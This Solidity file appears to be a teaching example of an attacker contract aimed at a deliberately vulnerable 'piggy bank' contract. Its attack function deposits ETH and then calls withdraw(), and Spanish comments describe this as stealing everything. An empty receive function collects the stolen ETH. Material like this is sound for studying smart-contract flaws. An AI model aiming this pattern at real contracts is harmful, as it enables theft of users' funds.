// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVulnerablePiggyBank {
    function deposit() external payable;
    function withdraw() external;
}

contract AttackerPiggyBank {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    // Enviamos ETH al contrato vulnerable
    function attack() public payable {
        IVulnerablePiggyBank(target).deposit{value: msg.value}();
        IVulnerablePiggyBank(target).withdraw(); // se roba todo
    }

    // Recibir ETH robado
    receive() external payable {}
}

